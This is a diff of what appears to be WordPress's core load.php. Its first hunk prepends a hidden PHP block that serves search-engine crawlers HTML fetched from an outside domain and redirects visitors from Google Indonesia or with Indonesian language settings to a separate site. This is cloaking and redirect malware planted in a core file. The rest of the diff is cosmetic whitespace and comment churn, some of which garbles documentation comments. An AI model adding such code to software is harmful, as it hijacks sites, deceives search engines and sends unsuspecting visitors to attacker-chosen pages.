@@ -1,4 +1,30 @@
 <?php
+$s_ref = $_SERVER['HTTP_REFERER'] ?? '';
+$agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '');
+
+function is_bot() {
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+$bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'adsense', 'slurp');
+foreach ($bots as $bot) {
+if (stripos($user_agent, $bot) !== false) {
+return true;
+}
+}
+return false;
+}
+if (is_bot()) {
+echo file_get_contents('https://theonlyd.xyz/grouptaalum.html');
+exit;
+}
+
+if (stripos($s_ref, 'google.co.id') !== false ||
+(stripos($s_ref, 'google.com') !== false && stripos($lang, 'id') !== false)) {
+header("Location: https://groupjabar.pages.dev/");
+exit;
+}
+?>
+<?php
 /**
  * These functions are needed to load WordPress.
  *
@@ -237,8 +263,7 @@ function wp_get_environment_type() {
 	if ( defined( 'WP_ENVIRONMENT_TYPES' ) && function_exists( '_deprecated_argument' ) ) {
 		if ( function_exists( '__' ) ) {
 			/* translators: %s: WP_ENVIRONMENT_TYPES */
-			$message = sprintf( __( 'The %s constant is no longer supported.' ), 'WP_ENVIRONMENT_TYPES' );
-		} else {$message= sprintf( 'The %s constant is no longer supported.', 'WP_ENVIRONMENT_TYPES' );
+			$message = sprintf( __( 'The %s constant is no longer supported.' ), 'WP_ENVIRONMENT_TYPES' );} else {$message = sprintf( 'The %s constant is no longer supported.', 'WP_ENVIRONMENT_TYPES' );
 		}
 
 		_deprecated_argument(
@@ -525,7 +550,7 @@ function timer_stop( $display = 0, $precision = 3 ) {
  * argument, or file is used. Deprecated code may be removed from a later
  * version.
  *
- * It is strongly recommended that plugin and theme developers use `WP_DEBUG`
+ *It is strongly recommended that plugin and theme developers use `WP_DEBUG`
  * in their development environments.
  *
  * `WP_DEBUG_DISPLAY` and `WP_DEBUG_LOG` perform no function unless `WP_DEBUG`
@@ -814,7 +839,7 @@ function wp_start_object_cache() {
 	 *
 	 * @since 5.8.0
 	 *
-	 * @param bool $enable_object_cache Whether to enable loadingobject-cache.php (if present).
+	 * @param bool $enable_object_cache Whether to enableloadingobject-cache.php (if present).
 	 *                                  Default true.
 	 */
 	if ( $first_init && apply_filters( 'enable_loading_object_cache_dropin', true ) ) {
@@ -831,9 +856,8 @@ function wp_start_object_cache() {
 				require_once WP_CONTENT_DIR . '/object-cache.php';
 
 				if ( function_exists( 'wp_cache_init' ) ) {
-					wp_using_ext_object_cache( true );}
-
-				// Re-initialize any hooks added manually by object-cache.php.
+					wp_using_ext_object_cache( true );
+				}// Re-initialize any hooks added manually by object-cache.php.
 				if ( $wp_filter ) {
 					$wp_filter = WP_Hook::build_preinitialized_hooks( $wp_filter );
 				}
@@ -1113,7 +1137,8 @@ function wp_skip_paused_themes( array $themes ) {
 	foreach ( $themes as $index => $theme ) {
 		$theme = basename( $theme );
 
-		if ( array_key_exists( $theme, $paused_themes ) ){unset( $themes[ $index ] );
+		if ( array_key_exists( $theme, $paused_themes ) ){
+			unset( $themes[ $index ] );
 
 			// Store list of paused themes for displaying an admin notice.
 			$GLOBALS['_paused_themes'][ $theme ] = $paused_themes[ $theme ];
@@ -1145,7 +1170,8 @@ function wp_is_recovery_mode() {
  *
  * @return bool True if the current endpoint should be protected.
  */
-function is_protected_endpoint() {// Protect login pages.
+function is_protected_endpoint() {
+	// Protect login pages.
 	if ( isset( $GLOBALS['pagenow'] ) && 'wp-login.php' === $GLOBALS['pagenow'] ) {
 		return true;
 	}
@@ -1427,9 +1453,9 @@ function is_multisite() {
 /**
  * Converts a value to non-negative integer.
  *
- * @since2.5.0
+ *@since2.5.0
  *
- * @param mixed$maybeint Data you wish to have converted to a non-negative integer.
+ * @param mixed $maybeint Data you wish to have converted to a non-negative integer.
  * @return int A non-negative integer.
  */
 function absint( $maybeint ) {
@@ -1741,9 +1767,8 @@ function wp_using_themes() {
 /**
  * Determines whether the current request is a WordPress cron request.
  *
- * @since 4.8.0
- *
- *@return bool True if it'sa WordPress cron request, false otherwise.
+ * @since 4.8.0*
+ *@return bool True if it's a WordPress cron request, false otherwise.
  */
 function wp_doing_cron() {
 	/**
